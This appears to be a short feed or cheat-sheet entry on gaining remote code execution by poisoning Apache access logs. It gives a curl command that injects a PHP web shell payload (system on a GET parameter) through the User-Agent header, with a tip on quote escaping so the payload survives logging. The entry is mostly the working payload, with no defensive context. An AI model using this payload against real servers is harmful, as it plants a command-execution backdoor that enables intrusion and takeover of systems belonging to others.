item.title: Time 2021 05 16
item.description: RCE via Apache logs Poison the User-Agent in access logs: $ curl <http://example.org/> -A "<?php system(\\$_GET['cmd']);?>" Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
